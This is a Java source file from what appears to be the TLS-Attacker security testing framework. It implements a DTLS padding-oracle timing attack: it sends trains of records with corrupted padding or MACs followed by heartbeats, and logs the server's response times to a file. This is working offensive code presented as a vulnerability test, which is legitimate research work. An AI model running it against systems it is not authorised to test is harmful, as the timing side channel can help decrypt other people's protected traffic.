/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.attacks.config.DtlsPaddingOracleAttackCommandConfig;
import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.dtls.record.DtlsRecordHandler;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.ConnectionEnd;
import anonymous.tlsattacker.tls.protocol.ProtocolMessage;
import anonymous.tlsattacker.tls.protocol.alert.AlertMessage;
import anonymous.tlsattacker.tls.protocol.application.ApplicationMessage;
import anonymous.tlsattacker.tls.constants.ProtocolMessageType;
import anonymous.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
import anonymous.tlsattacker.dtls.record.DtlsRecord;
import anonymous.tlsattacker.tls.constants.AlertDescription;
import anonymous.tlsattacker.tls.constants.AlertLevel;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.transport.UDPTransportHandler;
import anonymous.tlsattacker.util.RandomHelper;
import java.io.FileWriter;
import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.locks.LockSupport;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Tests if the subject can be used as a padding oracle by sending messages with
 * invalid MACs or invalid paddings.
 * 
 * @author anonymous Pfützenreuter <anonymous.pfuetzenreuter@anonymous>
 */
public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCommandConfig> {

    private static Logger LOGGER = LogManager.getLogger(DtlsPaddingOracleAttack.class);

    private TlsContext tlsContext;

    private DtlsRecordHandler recordHandler;

    private List<ProtocolMessage> protocolMessages;

    private UDPTransportHandler transportHandler;

    private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
	    modifiedMacArray = new ModifiableByteArray();

    private WorkflowExecutor workflowExecutor;

    private WorkflowTrace trace;

    public DtlsPaddingOracleAttack(DtlsPaddingOracleAttackCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	initExecuteAttack(configHandler);

	long[][] resultBuffer = new long[config.getNrOfRounds()][2];
	FileWriter fileWriter;
	StringBuilder sb;
	int counter = 0;

	workflowExecutor.executeWorkflow();

	try {
	    sb = new StringBuilder(50);
	    for (int i = 0; i < config.getNrOfRounds(); i++) {
		resultBuffer[i] = executeAttackRound();

		if (resultBuffer[i][0] == -1 || resultBuffer[i][1] == -1) {
		    sb.append("Round no. ");
		    sb.append(i + 1);
		    sb.append(" - No useful results were gained. Repeat.");
		    i--;
		} else {
		    sb.append(i + 1);
		    sb.append(" of ");
		    sb.append(config.getNrOfRounds());
		    sb.append(" rounds.\n");
		}
		LOGGER.info(sb.toString());
		sb.setLength(0);
	    }

	    if (config.getResultFilePath() != null) {
		sb = new StringBuilder(2097152);
		fileWriter = new FileWriter(config.getResultFilePath(), true);

		for (long[] roundResults : resultBuffer) {
		    sb.append(counter);
		    sb.append(";invalid_Padding;");
		    sb.append(roundResults[0]);
		    sb.append("\n");
		    counter++;
		    sb.append(counter);
		    sb.append(";invalid_MAC;");
		    sb.append(roundResults[1]);
		    sb.append("\n");
		    counter++;
		    // Limit string builder RAM usage to about 4 MiByte by
		    // writing out data
		    if (sb.length() > 2097000) {
			fileWriter.write(sb.toString());
			sb.setLength(0);
		    }
		}

		fileWriter.write(sb.toString());
		fileWriter.close();
	    }
	} catch (IOException e) {
	    LOGGER.info(e.getLocalizedMessage());
	}

	closeDtlsConnectionGracefully();

	transportHandler.closeConnection();
    }

    private long[] executeAttackRound() throws IOException {
	byte[] roundMessageData = new byte[config.getTrainMessageSize()];
	RandomHelper.getRandom().nextBytes(roundMessageData);
	HeartbeatMessage sentHbMessage = new HeartbeatMessage();
	sentHbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();

	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData,
		sentHbMessage);
	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData,
		sentHbMessage);
	long[] results = new long[2];

	results[0] = handleTrain(invalidPaddingTrain, sentHbMessage.getPayload().getValue(), "Invalid Padding");

	results[1] = handleTrain(invalidMacTrain, sentHbMessage.getPayload().getValue(), "Invalid MAC");

	return results;
    }

    private long handleTrain(byte[][] train, byte[] sentHeartbeatMessagePayload, String trainInfo) {
	try {
	    byte[] serverAnswer;

	    if (config.getMessageWaitNanos() > 0) {
		serverAnswer = handleTrainIOWithWaitNanos(train, config.getMessageWaitNanos());
	    } else {
		serverAnswer = handleTrainIO(train);
	    }

	    if (serverAnswer != null && serverAnswer.length > 1) {
		HeartbeatMessage receivedHbMessage = new HeartbeatMessage();
		List<anonymous.tlsattacker.tls.record.Record> parsedReceivedRecords = recordHandler
			.parseRecords(serverAnswer);
		if (parsedReceivedRecords.size() != 1) {
		    LOGGER.info("Unexpected number of records parsed from server. Train: {}", trainInfo);

		    flushTransportHandler();
		    return -1;
		} else {
		    receivedHbMessage.getProtocolMessageHandler(tlsContext).parseMessage(
			    parsedReceivedRecords.get(0).getProtocolMessageBytes().getValue(), 0);
		    if (!Arrays.equals(receivedHbMessage.getPayload().getValue(), sentHeartbeatMessagePayload)) {
			LOGGER.info("Heartbeat answer didn't contain the correct payload. Train: " + trainInfo);

			flushTransportHandler();
			return -1;
		    } else {
			LOGGER.info("Correct heartbeat-payload received. Train: {}", trainInfo);
		    }
		}
	    } else {
		LOGGER.info("No data from the server was received. Train: {}", trainInfo);
	    }
	    return transportHandler.getResponseTimeNanos();
	} catch (SocketTimeoutException e) {
	    LOGGER.info("Received timeout when waiting for heartbeat answer. Train: {}", trainInfo);
	} catch (Exception e) {
	    LOGGER.info(e.getMessage());
	}
	return -1;
    }

    private byte[] handleTrainIO(byte[][] train) throws Exception {
	for (byte[] record : train) {
	    transportHandler.sendData(record);
	}
	return transportHandler.fetchData();
    }

    private byte[] handleTrainIOWithWaitNanos(byte[][] train, long waitNanos) throws Exception {
	for (byte[] record : train) {
	    LockSupport.parkNanos(waitNanos);
	    transportHandler.sendData(record);
	}
	return transportHandler.fetchData();
    }

    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
	byte[][] train = new byte[n + 1][];
	List<anonymous.tlsattacker.tls.record.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	DtlsRecord record;
	apMessage.setData(messageData);

	for (int i = 0; i < n; i++) {
	    record = new DtlsRecord();
	    record.setPadding(modifiedPaddingArray);
	    records.add(record);
	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
	    records.remove(0);
	}

	records.add(new DtlsRecord());
	protocolMessages.add(heartbeatMessage);
	train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
		ProtocolMessageType.HEARTBEAT, records);

	return train;
    }

    private byte[][] createInvalidMacMessageTrain(int n, byte[] applicationMessageContent,
	    HeartbeatMessage heartbeatMessage) {
	byte[][] train = new byte[n + 1][];
	List<anonymous.tlsattacker.tls.record.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	apMessage.setData(applicationMessageContent);

	DtlsRecord record = new DtlsRecord();
	record.setMac(modifiedMacArray);
	record.setPadding(modifiedPaddingArray);
	records.add(record);
	byte[] recordBytes = recordHandler.wrapData(applicationMessageContent, ProtocolMessageType.APPLICATION_DATA,
		records);

	for (int i = 0; i < n; i++) {
	    train[i] = recordBytes;
	}

	records.remove(0);
	records.add(new DtlsRecord());
	protocolMessages.add(heartbeatMessage);
	train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
		ProtocolMessageType.HEARTBEAT, records));

	return train;
    }

    private void closeDtlsConnectionGracefully() {
	AlertMessage closeNotify = new AlertMessage();
	closeNotify.setConfig(AlertLevel.WARNING, AlertDescription.CLOSE_NOTIFY);
	List<anonymous.tlsattacker.tls.record.Record> records = new ArrayList<>();
	records.add(new DtlsRecord());

	try {
	    transportHandler.sendData(recordHandler.wrapData(closeNotify.getProtocolMessageHandler(tlsContext)
		    .prepareMessage(), ProtocolMessageType.ALERT, records));
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}
    }

    private void initExecuteAttack(ConfigHandler configHandler) {
	transportHandler = (UDPTransportHandler) configHandler.initializeTransportHandler(config);
	transportHandler.setTlsTimeout(config.getTimeout());
	tlsContext = configHandler.initializeTlsContext(config);
	workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
	recordHandler = (DtlsRecordHandler) tlsContext.getRecordHandler();
	trace = tlsContext.getWorkflowTrace();
	protocolMessages = trace.getProtocolMessages();
	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
	modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
		0));
    }

    private void flushTransportHandler() throws IOException {
	transportHandler.setTlsTimeout(50);
	try {
	    while (true) {
		transportHandler.fetchData();
	    }
	} catch (SocketTimeoutException e) {
	} finally {
	    transportHandler.setTlsTimeout(config.getTimeout());
	}
    }
}
